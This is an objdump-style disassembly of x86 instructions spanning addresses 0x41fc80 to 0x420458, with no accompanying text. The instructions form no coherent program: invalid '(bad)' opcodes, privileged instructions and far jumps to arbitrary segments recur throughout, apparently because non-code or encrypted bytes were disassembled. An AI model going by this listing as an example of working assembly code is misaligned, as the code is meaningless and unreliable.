  41fc80:	in     eax,0xc6
  41fc82:	xchg   BYTE PTR [eax-0x1e78345d],al
  41fc88:	or     bh,cl
  41fc8a:	inc    edx
  41fc8b:	call   0x89c8:0xceb32a9c
  41fc92:	stos   BYTE PTR es:[edi],al
  41fc93:	fild   DWORD PTR [ecx-0x4f]
  41fc96:	add    DWORD PTR [edx-0x48e7f695],esi
  41fc9c:	sbb    BYTE PTR [esp+ebx*1-0x1ace3d7a],0x6a
  41fca4:	and    edx,edx
  41fca6:	sbb    al,0x1d
  41fca8:	ds call 0xa992:0x8c5ccd3f
  41fcb0:	sub    al,0x63
  41fcb2:	and    DWORD PTR [ebx-0x6b],edx
  41fcb5:	mov    al,0xc2
  41fcb7:	pop    eax
  41fcb8:	je     0x41fd25
  41fcba:	loope  0x41fcc5
  41fcbc:	fcmovnb st,st(5)
  41fcbe:	mov    edi,0x5e9bbb9f
  41fcc3:	ins    DWORD PTR es:[edi],dx
  41fcc4:	mov    edx,es
  41fcc6:	jecxz  0x41fcbd
  41fcc8:	dec    ebp
  41fcc9:	ss (bad) 
  41fccb:	push   edi
  41fccc:	or     eax,0xa8788d5
  41fcd1:	int    0xec
  41fcd3:	adc    DWORD PTR [ebx-0x78442b9d],esp
  41fcd9:	retf   0x1928
  41fcdc:	jmp    0xc507ee7
  41fce1:	lock xchg bh,dl
  41fce4:	dec    BYTE PTR [edx+0x15fa9f63]
  41fcea:	jmp    0x5111d448
  41fcef:	push   0xd5d3810a
  41fcf4:	xor    eax,0x119ad407
  41fcf9:	scas   eax,DWORD PTR es:[edi]
  41fcfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcfb:	les    eax,FWORD PTR [ebx+0x67278db4]
  41fd01:	mov    DWORD PTR [ebp-0x43],ebx
  41fd04:	mov    ch,0x1c
  41fd06:	lods   al,BYTE PTR ds:[esi]
  41fd07:	xor    ah,ch
  41fd09:	(bad)  
  41fd0a:	fdivr  QWORD PTR [esi]
  41fd0c:	(bad)  
  41fd0d:	jnp    0x41fce5
  41fd0f:	jle    0x41fd7b
  41fd11:	outs   dx,BYTE PTR ds:[esi]
  41fd12:	test   al,0x84
  41fd14:	push   0xffffffa1
  41fd16:	dec    esp
  41fd17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd18:	mov    bl,0xb3
  41fd1a:	lahf   
  41fd1b:	pop    esi
  41fd1c:	das    
  41fd1d:	pushf  
  41fd1e:	dec    eax
  41fd1f:	inc    edx
  41fd20:	sbb    eax,0x612511e7
  41fd25:	cmp    eax,0x2c0ba0e6
  41fd2a:	dec    ecx
  41fd2b:	cmp    BYTE PTR [esi-0x31f3c4fa],ch
  41fd31:	xchg   edi,eax
  41fd32:	mov    ?,WORD PTR [eax+0xf]
  41fd35:	mov    BYTE PTR [ebp+edx*4+0x318fa664],dh
  41fd3c:	adc    ch,BYTE PTR [eax]
  41fd3e:	(bad)  
  41fd3f:	fistp  WORD PTR [edi+0x3b]
  41fd42:	bound  edx,QWORD PTR [esi-0x14]
  41fd45:	shr    DWORD PTR [ebx+eax*8+0xb16dc2d],1
  41fd4c:	ss xchg ecx,eax
  41fd4e:	jns    0x41fd44
  41fd50:	inc    ecx
  41fd51:	cdq    
  41fd52:	jmp    0x41fd4e
  41fd54:	imul   ecx,DWORD PTR [edx],0xd
  41fd57:	adc    al,0x40
  41fd59:	mov    bl,0x52
  41fd5b:	or     eax,0xd2331454
  41fd60:	inc    edx
  41fd61:	inc    esi
  41fd62:	(bad)  
  41fd63:	fldln2 
  41fd65:	test   al,0xb4
  41fd67:	mov    edx,0xfa807223
  41fd6c:	sbb    cl,dh
  41fd6e:	pop    ds
  41fd6f:	mov    edi,DWORD PTR [edx+ebx*8-0x3912947c]
  41fd76:	arpl   WORD PTR [edi-0x2ba9eb43],cx
  41fd7c:	jb     0x41fdce
  41fd7e:	sbb    ebx,DWORD PTR [esi-0x7482b633]
  41fd84:	or     cl,cl
  41fd86:	xchg   edx,eax
  41fd87:	iret   
  41fd88:	mov    bh,0xb9
  41fd8a:	xor    al,0x2f
  41fd8c:	leave  
  41fd8d:	mov    esi,0xf58291f
  41fd92:	or     esi,esi
  41fd94:	inc    edi
  41fd95:	mov    al,0x40
  41fd97:	loope  0x41fd3e
  41fd99:	in     eax,dx
  41fd9a:	repnz xchg ecx,eax
  41fd9c:	clc    
  41fd9d:	stc    
  41fd9e:	outs   dx,DWORD PTR ds:[esi]
  41fd9f:	iret   
  41fda0:	lock xchg edi,eax
  41fda2:	in     eax,dx
  41fda3:	inc    ecx
  41fda4:	jbe    0x41fd33
  41fda6:	mov    esp,0x4adf6a39
  41fdab:	jae    0x41fd86
  41fdad:	rcr    DWORD PTR [esi],cl
  41fdaf:	sbb    ecx,DWORD PTR [edx]
  41fdb1:	xchg   ebp,eax
  41fdb2:	outs   dx,BYTE PTR ds:[esi]
  41fdb3:	jo     0x41fd58
  41fdb5:	xor    eax,0xfef90c37
  41fdba:	stos   BYTE PTR es:[edi],al
  41fdbb:	cmp    al,0xae
  41fdbd:	into   
  41fdbe:	test   al,0x2a
  41fdc0:	shl    DWORD PTR [eax+0x16],0xee
  41fdc4:	cld    
  41fdc5:	es mov esp,0x2214d0e
  41fdcb:	jmp    0x9c71:0x7ad92173
  41fdd2:	ja     0x41fe37
  41fdd4:	dec    ecx
  41fdd5:	jo     0x41fe08
  41fdd7:	ins    DWORD PTR es:[edi],dx
  41fdd8:	hlt    
  41fdd9:	cmp    dl,BYTE PTR [esi+edx*4+0x7396b663]
  41fde0:	or     DWORD PTR [edi-0x34],ebp
  41fde3:	push   ss
  41fde4:	jo     0x41fe07
  41fde6:	clc    
  41fde7:	hlt    
  41fde8:	sti    
  41fde9:	sub    DWORD PTR [edx],0xfd8e473a
  41fdef:	ins    DWORD PTR es:[edi],dx
  41fdf0:	out    dx,eax
  41fdf1:	mov    ?,WORD PTR [ecx]
  41fdf3:	call   0x9519:0x95831e19
  41fdfa:	push   edx
  41fdfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fdfc:	inc    ebp
  41fdfd:	xlat   BYTE PTR ds:[ebx]
  41fdfe:	jnp    0x41fdf4
  41fe00:	xor    al,0x69
  41fe02:	or     al,0x14
  41fe04:	adc    eax,0x7f209c6c
  41fe09:	neg    BYTE PTR [esi]
  41fe0b:	sub    ah,dh
  41fe0d:	(bad)  
  41fe0f:	jno    0x41fe79
  41fe11:	sbb    ecx,DWORD PTR [ebp+0x47a1e6f3]
  41fe17:	aas    
  41fe18:	mov    edx,0xfe3fb636
  41fe1d:	fidiv  DWORD PTR [ebp-0x7e0f318a]
  41fe23:	add    BYTE PTR [edx],ah
  41fe25:	repz enter 0xfbb8,0x93
  41fe2a:	and    al,0x75
  41fe2c:	test   al,0x83
  41fe2e:	cmp    DWORD PTR [esi+0xf],ecx
  41fe31:	xor    al,0x71
  41fe33:	jne    0x41fdfd
  41fe35:	xor    cl,ch
  41fe37:	dec    esp
  41fe38:	call   0x319de24a
  41fe3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe3e:	call   0xc2c772f0
  41fe43:	out    dx,al
  41fe44:	push   ebx
  41fe45:	adc    BYTE PTR [ebx+edx*2+0x6fda857d],ch
  41fe4c:	push   eax
  41fe4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe4e:	enter  0xf0ea,0x7f
  41fe52:	rcl    DWORD PTR [esp+ebx*8-0x24],1
  41fe56:	(bad)  [ebx-0x46fb2bf9]
  41fe5c:	xchg   ebp,eax
  41fe5d:	gs int3 
  41fe5f:	jne    0x41fe5a
  41fe61:	cli    
  41fe62:	adc    dh,ch
  41fe64:	aad    0x72
  41fe66:	xor    eax,0x97c4bf1e
  41fe6b:	imul   DWORD PTR [edx+0x31306b36]
  41fe71:	sub    al,0xb3
  41fe73:	ror    DWORD PTR ds:0xcaccae3a,cl
  41fe79:	mov    al,fs:0x31c599d4
  41fe7f:	push   esi
  41fe80:	jmp    0x9b28:0x86be43b4
  41fe87:	pop    esp
  41fe88:	ds mov edx,0x2d8fd042
  41fe8e:	or     al,0xad
  41fe90:	ins    BYTE PTR es:[edi],dx
  41fe91:	and    edx,DWORD PTR [ebx]
  41fe93:	jnp    0x41fecf
  41fe95:	ins    BYTE PTR es:[edi],dx
  41fe96:	push   0x56d7803
  41fe9b:	das    
  41fe9c:	test   DWORD PTR [eax-0x454760e4],ebx
  41fea2:	nop
  41fea3:	aaa    
  41fea4:	mov    ds:0xa5e8e69b,al
  41fea9:	or     edx,eax
  41feab:	ret    
  41feac:	sbb    al,0x2a
  41feae:	ins    BYTE PTR es:[edi],dx
  41feaf:	addr16 xchg ebp,eax
  41feb1:	(bad)
  41feb4:	mov    cl,0x81
  41feb6:	push   eax
  41feb7:	pop    ss
  41feb8:	mov    ah,0x3b
  41feba:	xchg   edi,eax
  41febb:	mov    BYTE PTR [ecx],ch
  41febd:	idiv   DWORD PTR [ecx+0xb]
  41fec0:	and    esi,DWORD PTR [ebx-0x690dfefd]
  41fec6:	fwait
  41fec7:	adc    ah,0x8f
  41feca:	mov    dh,0x55
  41fecc:	or     DWORD PTR [ebx+edx*1],ebp
  41fecf:	jg     0x41fed5
  41fed1:	push   esp
  41fed2:	pop    ebx
  41fed3:	adc    al,0xff
  41fed5:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fed7:	imul   esp,DWORD PTR [ecx],0x83dab327
  41fedd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fede:	fnstcw WORD PTR [edi+0x4e]
  41fee1:	xchg   DWORD PTR [edx-0x6238dc76],eax
  41fee7:	push   es
  41fee8:	and    dh,dh
  41feea:	jmp    0x41fef3
  41feec:	mov    edx,0xde9be9e8
  41fef1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fef2:	ins    BYTE PTR es:[edi],dx
  41fef3:	sub    DWORD PTR [eax+0x2498f0bb],ecx
  41fef9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fefa:	(bad)  
  41fefb:	mov    cl,0xf9
  41fefd:	in     eax,0xab
  41feff:	mov    dl,0x32
  41ff01:	scas   eax,DWORD PTR es:[edi]
  41ff02:	scas   eax,DWORD PTR es:[edi]
  41ff03:	dec    ebp
  41ff04:	nop
  41ff05:	jle    0x41ff0d
  41ff07:	cmp    BYTE PTR [esi+0x14cf30e8],bl
  41ff0d:	imul   BYTE PTR [esi+0x74]
  41ff10:	mov    ah,0xb7
  41ff12:	jbe    0x41fec3
  41ff14:	mov    al,0x19
  41ff16:	scas   eax,DWORD PTR es:[edi]
  41ff17:	(bad)  
  41ff18:	fadd   QWORD PTR ss:[esi-0x4d]
  41ff1c:	adc    ah,BYTE PTR [ebx+edx*1+0x64]
  41ff20:	scas   al,BYTE PTR es:[edi]
  41ff21:	mov    DWORD PTR [ebx-0x1],ebx
  41ff24:	jecxz  0x41ff0b
  41ff26:	rol    DWORD PTR [ecx+0x511e48e],0x5d
  41ff2d:	xor    eax,0x7199049
  41ff32:	inc    ebx
  41ff33:	or     dh,BYTE PTR [esi-0x68dd5c22]
  41ff39:	add    eax,0xfc2bdbc3
  41ff3e:	jne    0x41fec1
  41ff40:	mov    bl,0x5a
  41ff42:	add    DWORD PTR [edx-0x6864f727],0xfffffff4
  41ff49:	out    dx,eax
  41ff4a:	push   cs
  41ff4b:	pop    edi
  41ff4c:	add    al,0x4b
  41ff4e:	into   
  41ff4f:	jecxz  0x41ff41
  41ff51:	mov    esi,0x19a4af67
  41ff56:	push   ebp
  41ff57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff58:	into   
  41ff59:	mov    WORD PTR [eax],ds
  41ff5b:	push   edi
  41ff5c:	fidiv  WORD PTR [edx+0x7a]
  41ff5f:	sahf   
  41ff60:	add    al,0xf7
  41ff62:	sub    eax,0x17b06147
  41ff67:	out    dx,al
  41ff68:	call   0xbd93f049
  41ff6d:	ret    0xaa7c
  41ff70:	inc    ecx
  41ff71:	(bad)  [eax+0x5084e600]
  41ff77:	in     eax,0x29
  41ff79:	xor    eax,0x15af82a6
  41ff7e:	jno    0x41ff00
  41ff80:	mov    eax,0xcba326a5
  41ff85:	add    edx,DWORD PTR [ecx-0x4a]
  41ff88:	or     DWORD PTR [ebx],edi
  41ff8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff8b:	out    0x93,eax
  41ff8d:	pusha  
  41ff8e:	test   al,0xad
  41ff90:	jns    0x41ff9c
  41ff92:	xor    bh,BYTE PTR [eax+ebx*8-0x21a6a55c]
  41ff99:	xor    eax,0x14e31a09
  41ff9e:	pop    eax
  41ff9f:	enter  0x8ef8,0xb7
  41ffa3:	rcl    DWORD PTR ds:0x29e1511e,cl
  41ffa9:	outs   dx,DWORD PTR ds:[esi]
  41ffaa:	mov    esp,0xc355f4f
  41ffaf:	adc    ecx,DWORD PTR [eax]
  41ffb1:	pop    esi
  41ffb2:	stc    
  41ffb3:	fsub   st(2),st
  41ffb5:	xor    eax,0xfe410ebd
  41ffba:	mov    cl,0x28
  41ffbc:	xor    eax,0xff2c79c0
  41ffc1:	jo     0x420003
  41ffc3:	es push edi
  41ffc5:	imul   ebx,DWORD PTR [edi],0xa1624084
  41ffcb:	xor    eax,0xdd32993b
  41ffd0:	fucom  st(4)
  41ffd2:	xchg   edx,eax
  41ffd3:	xor    al,0xc4
  41ffd5:	pushf  
  41ffd6:	pop    esi
  41ffd7:	test   eax,0x33771fb9
  41ffdc:	mov    dh,0xa4
  41ffde:	punpcklbw mm5,DWORD PTR [ecx]
  41ffe1:	rcr    DWORD PTR [edx-0x31],0x18
  41ffe5:	mov    eax,0xa82cd008
  41ffea:	push   0xa45a3944
  41ffef:	mov    ebx,0x96a19ef9
  41fff4:	das    
  41fff5:	lock xchg ebx,eax
  41fff7:	sahf   
  41fff8:	sbb    DWORD PTR ds:0xea19e632,esp
  41fffe:	or     edi,DWORD PTR [eax-0x4e]
  420001:	jl     0x41ff8f
  420003:	mov    gs,WORD PTR [esi+0x28af2846]
  420009:	mov    edi,0x8e837a84
  42000e:	inc    esi
  42000f:	adc    al,0x23
  420011:	dec    edx
  420012:	jmp    0x19b5:0x153ca260
  420019:	rcr    BYTE PTR [ebp-0x64],cl
  42001c:	xchg   esi,edi
  42001e:	dec    eax
  42001f:	mov    cl,ch
  420021:	mov    esi,0x7ac2ab96
  420026:	pop    ecx
  420027:	and    ch,cl
  420029:	psllq  mm4,mm0
  42002c:	mov    ebx,0x2d4a208f
  420031:	pop    ebp
  420032:	push   ds
  420033:	cmp    bl,dh
  420035:	bound  eax,QWORD PTR [esi-0x49]
  420038:	adc    ebx,0xffffffdb
  42003b:	hlt    
  42003c:	and    eax,0x783da3fb
  420041:	cmp    DWORD PTR [edi-0x7d],0x15b41c65
  420048:	(bad)  
  420049:	mov    ds:0xbe88869b,al
  42004e:	ror    esp,0x11
  420051:	pop    esi
  420052:	jno    0x420085
  420054:	inc    edx
  420055:	mov    DWORD PTR [ecx-0x2cd5f5ce],ebx
  42005b:	sub    al,0x58
  42005d:	mov    ch,0x6c
  42005f:	pop    es
  420060:	push   ebx
  420061:	sti    
  420062:	(bad)  
  420064:	adc    DWORD PTR [eax],edx
  420066:	nop
  420067:	popf   
  420068:	das    
  420069:	jle    0x4200cd
  42006b:	rcr    DWORD PTR [edi-0x6b],0x7b
  42006f:	cmp    ch,ch
  420071:	cmp    DWORD PTR [eax],ecx
  420073:	dec    esi
  420074:	(bad)  
  420075:	pusha  
  420076:	int3   
  420077:	mov    bh,0xd1
  420079:	mov    ah,BYTE PTR [ebx-0x4a5c0dee]
  42007f:	ins    BYTE PTR es:[edi],dx
  420080:	push   ebx
  420081:	push   cs
  420082:	jb     0x42005a
  420084:	sti    
  420085:	add    ah,BYTE PTR fs:[edi+0xcb74bd1]
  42008c:	sub    al,0xca
  42008e:	mov    ds:0xf7f2afc1,al
  420093:	xchg   edi,eax
  420094:	jmp    0x420017
  420096:	sub    BYTE PTR [ecx+0x64],cl
  420099:	gs pop ebp
  42009b:	add    eax,0xae6bde78
  4200a0:	sbb    eax,0x81669797
  4200a5:	loop   0x420107
  4200a7:	and    al,0x4d
  4200a9:	out    0xd,al
  4200ab:	jg     0x420048
  4200ad:	cmp    BYTE PTR [ebx-0x4a0b22cf],0xd6
  4200b4:	fdiv   QWORD PTR [ebx]
  4200b6:	lea    edx,[esi]
  4200b8:	pushf  
  4200b9:	adc    DWORD PTR [ecx-0x71],ecx
  4200bc:	popf   
  4200bd:	inc    ecx
  4200be:	mov    eax,ds:0xdca619b3
  4200c3:	mov    DWORD PTR [ebx+0x48],ecx
  4200c6:	rcr    al,1
  4200c8:	xor    DWORD PTR [eax-0x6a64cf6d],0xffffffae
  4200cf:	ret    
  4200d0:	or     eax,0x2a2d61d9
  4200d5:	mov    ds:0x6ff593e6,eax
  4200da:	pop    ds
  4200db:	inc    esp
  4200dc:	sub    bl,BYTE PTR [edi-0x24]
  4200df:	mov    ebp,0x3556159f
  4200e4:	push   esp
  4200e5:	inc    esi
  4200e6:	jle    0x42015f
  4200e8:	xchg   ebx,eax
  4200e9:	push   esi
  4200ea:	outs   dx,DWORD PTR ds:[esi]
  4200eb:	popa   
  4200ec:	sar    dl,0x4c
  4200ef:	leave  
  4200f0:	jg     0x4200d3
  4200f2:	xchg   BYTE PTR [eax+0x15],bl
  4200f5:	mov    ?,WORD PTR [edi]
  4200f7:	ret    0x3a02
  4200fa:	ja     0x420109
  4200fc:	mov    ebx,0x7cf6d4c
  420101:	shr    BYTE PTR [edx+0xe99a98c],1
  420107:	aas    
  420108:	cdq    
  420109:	jmp    0x420163
  42010b:	mov    ebp,0x7e5c1e0a
  420110:	mov    ch,0x98
  420112:	jmp    0x420101
  420114:	jo     0x4200b5
  420116:	scas   al,BYTE PTR es:[edi]
  420117:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420118:	je     0x4200fb
  42011a:	xchg   ebx,eax
  42011b:	fist   DWORD PTR [ebp-0x495a8225]
  420121:	inc    esp
  420122:	lock (bad) 
  420125:	fisttp WORD PTR ds:0xfa2a065b
  42012b:	rcl    DWORD PTR [edx+0x5c],1
  42012e:	stos   BYTE PTR es:[edi],al
  42012f:	sbb    al,0x23
  420131:	mov    edx,0x32300f42
  420136:	pslld  mm2,QWORD PTR [ebp-0x48840fb8]
  42013d:	(bad)  
  42013e:	jle    0x42014a
  420140:	jmp    0x4201a1
  420142:	adc    eax,eax
  420144:	push   esp
  420145:	arpl   sp,dx
  420147:	xor    esp,ebx
  420149:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42014a:	jb     0x420171
  42014c:	add    dh,dh
  42014e:	sub    DWORD PTR [edi-0x75],esp
  420151:	push   ds
  420152:	adc    ah,dh
  420154:	jle    0x4200e8
  420156:	inc    ebx
  420157:	cmp    eax,0x472b481f
  42015c:	sub    eax,0x7fe08d66
  420161:	call   0x1ba3eb51
  420166:	inc    esi
  420167:	loopne 0x42011d
  420169:	add    al,0x29
  42016b:	test   BYTE PTR [edx-0x14319fd6],al
  420171:	or     al,0x5c
  420173:	cs xor al,0xf5
  420176:	sub    al,0xc2
  420178:	mov    ds:0xab195606,al
  42017d:	and    al,0x7
  42017f:	add    ebp,DWORD PTR [edi]
  420181:	cwde   
  420182:	push   eax
  420183:	popa   
  420184:	mov    cl,0xd7
  420186:	imul   esp,DWORD PTR [esp+eiz*4+0x37],0x1d5a83ee
  42018e:	dec    esi
  42018f:	mov    ch,0x48
  420191:	mov    esi,0x4a247eeb
  420196:	(bad)  
  420197:	cmp    BYTE PTR ds:0x4eef98a0,bh
  42019d:	cmp    DWORD PTR [ebp+eax*2-0x52eb4926],esi
  4201a4:	or     BYTE PTR [ecx+0x7dcad1fc],cl
  4201aa:	scas   eax,DWORD PTR es:[edi]
  4201ab:	shr    ah,1
  4201ad:	fidiv  WORD PTR ds:0x2510d535
  4201b3:	and    DWORD PTR [eax+0x40690f87],esp
  4201b9:	addr16 jmp 0xd66b5feb
  4201bf:	jo     0x42018a
  4201c1:	fidivr DWORD PTR [eax]
  4201c3:	mov    bh,0xf2
  4201c5:	cmp    BYTE PTR [ebx],0x8d
  4201c8:	hlt    
  4201c9:	cmp    DWORD PTR [esi],ecx
  4201cb:	mov    cl,0x91
  4201cd:	sbb    BYTE PTR [ebx+ecx*8],dh
  4201d0:	push   esi
  4201d1:	sbb    BYTE PTR [eax+0x7815a029],al
  4201d7:	sub    BYTE PTR [edx+0x67],al
  4201da:	jmp    0x4201fc
  4201dc:	cs ret 0x85a5
  4201e0:	mov    cl,0x57
  4201e2:	js     0x420253
  4201e4:	(bad)  
  4201e5:	(bad)  
  4201e6:	aad    0xd6
  4201e8:	arpl   WORD PTR [edx+0x51],bx
  4201eb:	pop    edi
  4201ec:	adc    BYTE PTR [eax],bl
  4201ee:	xchg   edx,eax
  4201ef:	rcr    DWORD PTR [eax+0x2bcc1c79],cl
  4201f5:	jp     0x42023c
  4201f7:	dec    edi
  4201f8:	dec    esp
  4201f9:	dec    esi
  4201fa:	ds shl ebx,1
  4201fd:	daa    
  4201fe:	stc    
  4201ff:	fsub   DWORD PTR [edi+0x4c]
  420202:	pop    es
  420203:	pop    ds
  420204:	dec    ecx
  420205:	mov    dh,0xa0
  420207:	or     al,0xbd
  420209:	xor    BYTE PTR ds:0x4bab0f6d,0x9c
  420210:	xchg   ebp,eax
  420211:	xchg   edx,eax
  420212:	inc    edi
  420213:	loope  0x42022c
  420215:	push   eax
  420216:	xor    DWORD PTR [eax-0x1f943b86],edx
  42021c:	leave  
  42021d:	test   eax,0xad36edf4
  420222:	mov    ds:0x11cf8666,al
  420227:	mov    bl,0x67
  420229:	or     al,0x35
  42022b:	xor    al,BYTE PTR [eax-0x5b]
  42022e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42022f:	jb     0x42027e
  420231:	pop    esi
  420232:	sbb    ah,BYTE PTR ds:0x1dae9ea
  420238:	mov    esp,0x577ffabf
  42023d:	sahf   
  42023e:	push   ecx
  42023f:	and    al,0x8e
  420241:	in     eax,dx
  420242:	push   ebp
  420243:	dec    ebx
  420244:	push   cs
  420245:	pushf  
  420246:	pop    ecx
  420247:	lods   eax,DWORD PTR ds:[esi]
  420248:	mov    ds:0x7141629c,eax
  42024d:	xor    al,0xdb
  42024f:	dec    ebx
  420250:	mov    ?,WORD PTR [edx-0x410591dc]
  420256:	xchg   esi,eax
  420257:	into   
  420258:	push   esp
  420259:	sbb    ecx,DWORD PTR [ebx]
  42025b:	cwde   
  42025c:	fcomp  QWORD PTR [esi]
  42025e:	aad    0xe7
  420260:	dec    edx
  420261:	clc    
  420262:	scas   eax,DWORD PTR es:[edi]
  420263:	or     eax,DWORD PTR [ecx+0x6c]
  420266:	push   es
  420267:	sbb    cl,BYTE PTR ds:0x485be3aa
  42026d:	dec    esp
  42026e:	mov    al,0x12
  420270:	xchg   ecx,eax
  420271:	aad    0xc3
  420273:	into   
  420274:	(bad)  
  420275:	jmp    0x6918f5f1
  42027a:	xor    ecx,DWORD PTR [ebx+0x7a]
  42027d:	cld    
  42027e:	cmp    eax,0xd8d23901
  420283:	xchg   edi,eax
  420284:	pop    esp
  420285:	mov    DWORD PTR [ecx+ebx*8],ebx
  420288:	inc    esi
  420289:	mov    ds:0xc33e6761,al
  42028e:	inc    esp
  42028f:	ss inc eax
  420291:	das    
  420292:	and    BYTE PTR [ebx-0x3319fbf7],0x98
  420299:	push   ebp
  42029a:	and    eax,0x58341a77
  42029f:	mov    ecx,0x6d851c1b
  4202a4:	jns    0x4202d9
  4202a6:	dec    edx
  4202a7:	cli    
  4202a8:	jp     0x420290
  4202aa:	cs jns 0x4202db
  4202ad:	push   ss
  4202ae:	mov    bl,0x99
  4202b0:	jb     0x420320
  4202b2:	push   0xb6dbace1
  4202b7:	mov    dl,0x37
  4202b9:	mov    ds:0x31446530,al
  4202be:	cwde   
  4202bf:	add    BYTE PTR [edx],bl
  4202c1:	or     ch,BYTE PTR [esi]
  4202c3:	xchg   ebp,eax
  4202c4:	inc    esp
  4202c5:	aam    0x23
  4202c7:	add    dl,bl
  4202c9:	sbb    eax,0x646087c8
  4202ce:	add    DWORD PTR [ecx+ebp*1+0x6c],0x4edc32f9
  4202d6:	pop    ecx
  4202d7:	or     dl,ch
  4202d9:	xor    eax,0x258833d0
  4202de:	imul   eax,DWORD PTR [esi+eiz*1-0x7069236a],0xfaacea84
  4202e9:	jmp    0x42029f
  4202eb:	add    ch,BYTE PTR [edx+0x9]
  4202ee:	aas    
  4202ef:	add    eax,0xda24f49
  4202f4:	data16 jbe 0x420283
  4202f7:	xchg   edx,eax
  4202f8:	fmulp  st(1),st
  4202fa:	xchg   ecx,eax
  4202fb:	mov    WORD PTR [ebx-0x42],ds
  4202fe:	adc    al,0x5c
  420300:	dec    esp
  420301:	mov    eax,0xdd237be1
  420306:	scas   eax,DWORD PTR es:[edi]
  420307:	test   eax,0xe0154b10
  42030c:	inc    ebp
  42030d:	mov    ecx,0x27534c10
  420312:	mov    al,0xda
  420314:	aam    0x48
  420316:	outs   dx,BYTE PTR ds:[esi]
  420317:	cmc    
  420318:	cli    
  420319:	out    0xc1,eax
  42031b:	ss push 0xfc4f523
  420321:	stc    
  420322:	test   BYTE PTR [eax+0x25],ch
  420325:	sub    eax,eax
  420327:	es push ebp
  420329:	pop    ebp
  42032a:	and    bl,ch
  42032c:	pop    ebx
  42032d:	fld    TBYTE PTR [ebp+0x2c639417]
  420333:	xor    BYTE PTR [edi],bl
  420335:	xchg   DWORD PTR [edx+0x437c19b0],ecx
  42033b:	inc    ch
  42033d:	sar    DWORD PTR [edi-0x713fd209],0x16
  420344:	mov    dh,0xa5
  420346:	mov    ds:0x15562de8,al
  42034b:	mov    bl,BYTE PTR [eax]
  42034d:	stc    
  42034e:	sub    eax,0x5c584c49
  420353:	adc    dh,BYTE PTR [edx+0x674a128e]
  420359:	std    
  42035a:	test   dh,bh
  42035c:	xor    eax,ebp
  42035e:	mov    ebx,fs
  420360:	sbb    al,BYTE PTR [esi]
  420362:	jns    0x4202f0
  420364:	sub    eax,0x4df9e233
  420369:	(bad)  
  42036a:	and    eax,0x66c2b56f
  42036f:	inc    edi
  420370:	sti    
  420371:	das    
  420372:	popf   
  420373:	mov    ebx,0x42d316ea
  420378:	les    ecx,FWORD PTR [ebx+edi*1+0x5c]
  42037c:	das    
  42037d:	wrmsr  
  42037f:	dec    ecx
  420380:	pop    esp
  420381:	mov    esp,0x8e97eb1d
  420386:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420387:	jp     0x42032b
  420389:	add    DWORD PTR [ecx+0x6b],0xfb9f7298
  420390:	jnp    0x420380
  420392:	test   eax,0x277cae58
  420397:	mov    esi,0x1c9db682
  42039c:	xchg   esi,eax
  42039d:	mov    DWORD PTR [ebp-0x77],ebx
  4203a0:	xor    bh,0x85
  4203a3:	loope  0x4203c1
  4203a5:	rcl    esi,0xeb
  4203a8:	xchg   esp,eax
  4203a9:	xchg   esp,eax
  4203aa:	inc    ecx
  4203ab:	cli    
  4203ac:	or     dh,BYTE PTR [edx-0x2c]
  4203af:	shr    ecx,cl
  4203b1:	add    BYTE PTR [ebx],0x76
  4203b4:	clc    
  4203b5:	mov    dx,0x1a8b
  4203b9:	mov    cl,0x6f
  4203bb:	daa    
  4203bc:	xchg   DWORD PTR [ebp+0x21],ebp
  4203bf:	xchg   edi,eax
  4203c0:	inc    esp
  4203c1:	stc    
  4203c2:	xor    cl,0x4a
  4203c5:	inc    edx
  4203c6:	mov    eax,0xb1f5d272
  4203cb:	push   cs
  4203cc:	pop    ecx
  4203cd:	jecxz  0x420417
  4203cf:	xchg   BYTE PTR [ecx+0x521b348],ah
  4203d5:	les    eax,FWORD PTR [eax-0x59cadf7b]
  4203db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203dc:	je     0x420382
  4203de:	out    dx,al
  4203df:	fidivr DWORD PTR [edx+0x51098370]
  4203e5:	jmp    0x42042f
  4203e7:	pop    edi
  4203e8:	cmp    BYTE PTR ds:0x22031d3f,0xf1
  4203ef:	jns    0x420415
  4203f1:	je     0x42040e
  4203f3:	dec    ecx
  4203f4:	push   esi
  4203f5:	out    dx,al
  4203f6:	jmp    0xb006b540
  4203fb:	or     DWORD PTR [edx],edx
  4203fd:	dec    ebx
  4203fe:	ret    0x4509
  420401:	ds popf 
  420403:	or     eax,0x87f9ca2f
  420408:	ds xor al,0x62
  42040b:	xor    DWORD PTR [edi-0xf],ebp
  42040e:	bound  esi,QWORD PTR [ebp-0x78]
  420411:	(bad)  
  420412:	(bad)  
  420413:	loop   0x4203b5
  420415:	js     0x420489
  420417:	xchg   DWORD PTR [edi],ecx
  420419:	cdq    
  42041a:	sub    DWORD PTR [edi+esi*4+0x52ab7d47],0x11f941e7
  420425:	ins    DWORD PTR es:[edi],dx
  420426:	pop    eax
  420427:	rcl    DWORD PTR [edx],0x65
  42042a:	lahf   
  42042b:	add    DWORD PTR [ebx+0x19],0x62457aef
  420432:	xor    al,0x9a
  420434:	xor    dh,BYTE PTR [eax-0x7baf861c]
  42043a:	pushf  
  42043b:	fldcw  WORD PTR [ebx]
  42043d:	(bad)  
  42043e:	fbld   TBYTE PTR [eax-0x62538e1]
  420444:	ss xchg edi,eax
  420446:	ja     0x420463
  420448:	or     al,0x24
  42044a:	cmp    eax,0xaeb65c12
  42044f:	jp     0x420457
  420451:	test   DWORD PTR gs:[edx+0x35],esi
  420455:	lea    edx,[edi]
  420457:	inc    esi
  420458:	lock or dh,BYTE PTR ds:0xbf8f702d
